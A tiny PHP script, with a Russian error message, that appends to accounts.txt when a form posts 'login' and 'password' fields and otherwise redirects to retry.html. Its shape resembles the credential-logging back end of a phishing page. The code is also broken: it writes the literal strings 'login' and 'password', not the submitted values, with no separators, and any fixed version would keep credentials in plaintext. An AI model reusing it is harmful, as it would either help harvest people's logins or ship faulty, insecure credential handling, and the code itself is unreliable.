<?php
$fd=fopen("accounts.txt",'a+') or die("Не удалось открыть файл");
$login = 0;
$password = 0;
if (isset($_POST['login']) && isset($_POST['password'])) 
    {
        $login = "login";
        $password = "password";
        fwrite($fd, $login);
        fwrite($fd, $password);
    }
else 
    {
        header('Location: retry.html');
    }
fclose($fd);

?>
